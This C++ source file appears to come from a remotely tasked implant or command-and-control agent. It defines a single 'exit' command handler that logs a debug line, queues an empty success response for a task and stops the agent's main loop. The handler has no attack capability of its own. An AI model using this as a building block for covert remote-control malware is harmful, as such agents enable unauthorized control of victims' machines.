#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>

#ifdef INCLUDE_CMD_EXIT

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_exit(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    DBG_PRINT( inst, "cmd_exit: shutting down\n" );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, symbol<char*>( const_cast<char*>( "" ) ) );
    inst.agent.running = false;
}

#endif
